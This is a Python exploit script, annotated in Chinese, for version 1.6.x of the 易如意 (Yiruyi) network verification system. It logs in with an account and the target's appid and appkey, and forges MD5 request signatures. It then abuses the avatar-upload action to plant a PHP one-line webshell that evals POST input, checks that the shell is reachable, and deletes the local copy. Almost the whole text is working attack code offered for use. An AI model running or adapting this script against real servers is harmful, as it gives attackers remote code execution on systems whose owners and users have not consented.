'''
上传webshell(一句話木馬)到易如意1.6网络验证系统
已驗證版本:
1.6.x
需要自己先獲取一個帳號(沒有帳號只有token也可以),並且知道目標appid和對應的appkey
https://www.eruyi.cn/thread-5802-1-6.html

2020-06-17
'''

import time
import hashlib
import requests
import re
import os


def get_sign(action, app_key):
    # app_key = '0bbdbd4f390894e78a3244ec0a596791'
    # sign_time = 2147483647
    sign_time = 100
    locate_time = int(time.time() / sign_time) * sign_time
    data = action + app_key + str(locate_time)
    md = hashlib.md5()
    md.update(data.encode('utf-8'))
    return md.hexdigest()


"""
登录需要用户名和密码，机器码

"""


def get_toekn(sign, host, appid):
    uri = 'http://{host}?action={action}&appid={appid}&sign={sign}'.format(host=host,
                                                                           action='login', appid=appid,
                                                                           sign=sign)
    user = input("输入用户名:")
    password = input("请输入密码:")
    markcode = input("请输入机器码:")
    d = {'user': user,
         'password': password,
         'markcode': markcode
         }
    res = requests.post(uri, data=d)
    token = re.findall('"token":"(.*.?)"}', res.text)
    uid = re.findall('"uid":"(.*?)"', res.text)
    return token, uid


def write_php():
    payload = """<?php eval($_POST[pass]);phpinfo()?>"""
    with open('shell_yiruyi.php', 'w', encoding='UTF-8') as f:
        f.write(payload)


def upload_file(alterpic_sign, host, token, appid):
    upload_uri = 'http://{host}?action={action}&appid={appid}&sign={sign}&type=bbp&token={token}'.format(
        host=host,
        action='alterpic', appid=appid,
        sign=alterpic_sign, token=token)
    write_php()
    files = {'name': ('shell_yiruyi.php', open('shell_yiruyi.php', 'r'), 'application/x-php')}
    res = requests.post(upload_uri, files=files)


def check_file(uid, host):
    host = host.split("/")
    host.remove('api.php')
    host = "/".join(host)
    uri = "http://{host}/pic/{uid}.php".format(host=host, uid=uid)
    res = requests.get(uri)
    if '404' not in res.text:
        print('上传成功')


def main():
    actions = ['login', 'alterpic']  # 定义动作列表 遍历
    # host = '192.168.56.140/1/api.php'
    host = input("请输入目标地址\t格式如：192.168.56.140/1/api.php\t:")
    appid = input('请输入appid:')
    app_key = input("输入appkey:")
    for action in actions:
        if action == 'login':
            login_sign = get_sign(action, app_key)
            token, uid = get_toekn(login_sign, host, appid)
            token = "".join(token)
            uid = "".join(uid)
            print("token\t:\t{}\t".format(token))

        if action == 'alterpic':
            alterpic_sign = get_sign(action, app_key)
        print("{}     Sign:\t{}".format(action, get_sign(action, app_key)))

    upload_file(alterpic_sign, host, token, appid)
    check_file(uid, host)
    os.remove('shell_yiruyi.php')  # 清除本地文件

if __name__ == '__main__':
    main()
